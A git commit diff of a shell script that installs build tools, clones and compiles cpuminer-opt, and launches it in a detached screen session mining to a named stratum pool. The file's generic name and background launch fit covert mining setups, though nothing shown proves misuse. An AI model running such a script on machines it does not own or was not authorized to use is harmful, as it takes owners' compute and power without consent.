8418aed21ad99d9f332677a11d27c97568368d88
doidepdut <32607304+doidepdut@users.noreply.github.com>
2018-08-15 15:03:39 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
-sudo apt-get update && apt-get -y upgrade
-sudo apt-get install cpulimit -y
-sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen
-git clone https://github.com/JayDDee/cpuminer-opt
-cd cpuminer-opt
-./build.sh
-cp cpuminer ../
-cd ..
-screen -d -m ./cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u nodata.nodata -p x
-cd
-cpulimit --exe cpuminer --limit 200 -b
+sudo apt-get update
+sudo apt-get -y install screen git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
+sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
+git clone https://github.com/JayDDee/cpuminer-opt && cd cpuminer-opt && chmod +x build.sh && ./build.sh
+CFLAGS="-march=native" ./configure
+make
+echo "cpuminer is starting"
+screen -S cpuminer 
+screen -d -m ./cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u nodata.nodata -p x -t 4
